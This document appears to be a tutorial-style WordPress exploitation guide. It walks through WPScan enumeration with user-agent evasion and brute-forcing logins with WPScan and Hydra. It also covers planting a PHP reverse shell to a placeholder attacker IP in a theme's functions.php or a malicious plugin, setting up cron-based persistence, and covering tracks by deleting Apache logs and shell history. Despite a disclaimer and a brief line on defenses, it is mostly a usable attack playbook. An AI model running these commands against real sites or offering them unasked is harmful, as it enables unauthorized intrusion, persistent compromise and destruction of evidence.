# WordPress Exploitation Guide

## Introduction
WordPress is one of the most widely used CMS platforms, making it a common target for security testing. This guide covers **enumeration, vulnerability scanning, and exploitation techniques** using **WPScan** and other tools.

**Warning:** This guide is for educational and authorized security testing only. Unauthorized access is illegal.

---

## Installing WPScan
WPScan is a WordPress security scanner used for **enumerating users, plugins, themes, and vulnerabilities**.

### Install WPScan on Linux
```bash
sudo apt update && sudo apt install wpscan -y
```
Or install using Ruby:
```bash
gem install wpscan
```
Verify installation:
```bash
wpscan --help
```

---

## Enumerating WordPress Information
### Detect WordPress Version
```bash
wpscan --url http://target.com --rua
```
- **`--rua`** → Random user-agent to avoid detection.

### Enumerate WordPress Users
```bash
wpscan --url http://target.com -e u
```
- **`-e u`** → Enumerate users (useful for brute-force attacks).

### Enumerate Installed Plugins
```bash
wpscan --url http://target.com -e p
```
- **`-e p`** → Enumerate plugins (check for vulnerable versions).

### Enumerate Themes
```bash
wpscan --url http://target.com -e t
```
- **`-e t`** → Enumerate themes.

### Full Enumeration Scan
```bash
wpscan --url http://target.com -e u,p,t --api-token YOUR_API_TOKEN
```
- **Using an API token** enables checking against WPScan’s vulnerability database.

---

## Brute-Forcing WordPress Logins
### Using WPScan for Brute-Force
```bash
wpscan --url http://target.com -U users.txt -P passwords.txt --max-threads 10
```
- **`-U users.txt`** → Uses a list of usernames.
- **`-P passwords.txt`** → Uses a password list.
- **`--max-threads 10`** → Uses 10 concurrent threads for speed.

### Using Hydra for Brute-Force
```bash
hydra -L users.txt -P passwords.txt http-post-form \
'wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect'
```
- **`-L users.txt`** → Username list.
- **`-P passwords.txt`** → Password list.
- **Customizes login request parameters for WordPress.**

---

## Exploiting Vulnerabilities
### Checking for Known Vulnerabilities
Use WPScan to check for outdated versions and vulnerabilities:
```bash
wpscan --url http://target.com --api-token YOUR_API_TOKEN
```
- Checks themes, plugins, and core version against vulnerability database.

### Searching Exploit-DB for WordPress Exploits
```bash
searchsploit wordpress
```
- Returns available exploits for WordPress and its plugins.

### Manually Checking for Exposed Files
```bash
curl -s http://target.com/wp-config.php~
curl -s http://target.com/.git/
```
- Some sites leave **backup files** and `.git` folders exposed.

---

## Uploading a Malicious Plugin or Theme
If admin credentials are obtained, a backdoor can be uploaded using a **malicious plugin**.

### Uploading a Web Shell as a Plugin
1. Create a zip file with a PHP shell inside `/wp-content/plugins/`.
2. Upload it via the WordPress Admin Panel (`Appearance > Plugins > Add New`).
3. Activate the plugin to execute the payload.

### Modifying an Existing Theme
1. Edit `functions.php` inside an installed theme.
2. Add a PHP web shell:
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"); ?>
```
3. Access the theme file in a browser to trigger the shell.

---

## Post-Exploitation Steps
### Maintaining Access
- **Create a new admin user** via SQL injection or shell access.
- **Modify the wp-config.php** to include persistent backdoors.
- **Schedule reverse shells** via cron jobs.

### Covering Tracks
- Delete logs: `rm -rf /var/log/apache2/*`
- Clear history: `history -c`

---

## Conclusion
WordPress security testing involves **enumeration, brute-force attacks, vulnerability exploitation, and post-exploitation persistence**. Proper defenses include **hardened login credentials, disabling unused plugins, and updating regularly**.

Test ethically and secure your WordPress sites properly.

